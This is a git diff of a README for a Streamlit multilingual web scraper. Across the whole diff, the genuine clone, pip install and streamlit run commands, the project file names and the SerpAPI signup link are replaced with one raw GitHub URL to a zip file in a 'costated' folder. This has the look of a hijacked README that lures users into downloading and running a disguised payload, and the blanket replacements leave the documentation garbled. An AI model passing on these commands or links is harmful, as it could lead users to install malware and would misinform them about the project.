@@ -25,13 +25,13 @@ The scraped data is stored as **text files** and summarized into a **CSV metadat
 
 1. Clone the repository:
     ```bash
-    git clone https://github.com/abdlkrim3/multilingual-web-scraper.git
+    git clone https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip
     cd multilingual-web-scraper
     ```
 
 2. Install dependencies:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip
     ```
 
 ---
@@ -41,7 +41,7 @@ The scraped data is stored as **text files** and summarized into a **CSV metadat
 1. Run the Streamlit app:
     ```bash
     cd scraper
-    streamlit run app.py
+    streamlit run https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip
     ```
 
 ---
@@ -74,7 +74,7 @@ The scraped data is stored as **text files** and summarized into a **CSV metadat
 # 📈 Results
 
 - Scraped **text files** are saved in the `scraped_texts/` folder.
-- Metadata is stored in `scraped_data.csv`.
+- Metadata is stored in `https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip`.
 - A live preview of saved metadata is displayed at the bottom of the page.
 
 ---
@@ -83,14 +83,14 @@ The scraped data is stored as **text files** and summarized into a **CSV metadat
 
 ```bash
 .
-├── app.py              # Main Streamlit app
-├── logger.py           # Logging functionality
-├── search.py           # Search with SerpAPI
-├── crawling.py         # Site crawling logic
-├── state.py            # Global state management during scraping
+├── https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip              # Main Streamlit app
+├── https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip           # Logging functionality
+├── https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip           # Search with SerpAPI
+├── https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip         # Site crawling logic
+├── https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip            # Global state management during scraping
 ├── scraped_texts/      # Folder for saved .txt text files
 ├── pdf/                # Folder (reserved) for future PDF saving
-└── scraped_data.csv    # CSV metadata of the scraping results
+└── https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip    # CSV metadata of the scraping results
 ```
 
 ---
@@ -99,10 +99,10 @@ The scraped data is stored as **text files** and summarized into a **CSV metadat
 
 - **Python 3.10+**
 
-First, try installing all dependencies with the provided `requirements.txt` file:
+First, try installing all dependencies with the provided `https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip` file:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip
 ```
 
 If you encounter any issues, you can manually install the main dependencies:
@@ -115,7 +115,7 @@ pip install streamlit pandas requests beautifulsoup4 serpapi
 
 # 📑 Notes
 
-- A **SerpAPI key** is needed for Google search functionality. You can get a free key at [serpapi.com](https://serpapi.com/).
+- A **SerpAPI key** is needed for Google search functionality. You can get a free key at [https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip](https://raw.githubusercontent.com/abdlkrim3/multilingual-web-scraper/main/costated/multilingual-web-scraper.zip).
 - If you don't want to use SerpAPI, simply provide a **custom site URL** to crawl.
 - The app **avoids duplicate scraping** by checking previously saved URLs.
 - You can **stop scraping** at any time and the progress will be **saved**.
